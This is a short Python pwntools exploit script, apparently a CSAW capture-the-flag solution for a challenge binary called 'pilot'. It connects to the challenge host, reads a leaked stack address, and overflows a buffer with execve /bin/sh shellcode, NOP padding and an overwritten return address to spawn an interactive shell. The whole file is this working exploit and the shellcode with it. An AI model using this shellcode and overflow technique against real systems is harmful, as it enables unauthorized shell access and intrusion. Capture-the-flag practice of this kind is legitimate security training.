#usr/bin/python

from pwn import *

r = remote('pwn.chal.csaw.io',8464)
#r = process('./pilot')
print util.proc.pidof(r)

shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
r.recvuntil('[*]Location:')
ret_addr = int(r.recvline(),16)
print hex(ret_addr)
r.recvuntil('[*]Command:')
payload = ''
payload += shellcode
payload = payload.ljust(0x28,'\x90')
payload += p64(ret_addr)
pause()
r.sendline(payload)

r.interactive()